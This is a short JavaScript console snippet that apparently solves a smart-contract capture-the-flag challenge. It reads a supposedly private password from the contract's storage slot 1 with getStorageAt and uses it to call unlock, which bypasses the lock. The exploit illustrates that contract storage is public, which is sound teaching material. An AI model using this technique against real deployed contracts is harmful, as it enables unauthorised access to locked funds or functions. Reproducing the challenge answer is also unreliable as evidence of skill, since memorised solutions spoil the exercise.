
//confirm that the contract is intially locked
await contract.locked()

//read password which would be at the second storage slot (i.e. index 1)
let password = await web3.eth.getStorageAt(contract.address, 1)

// call unlock function with the password
await contract.unlock(password)

//confirm the contract is no longer locked
await contract.locked()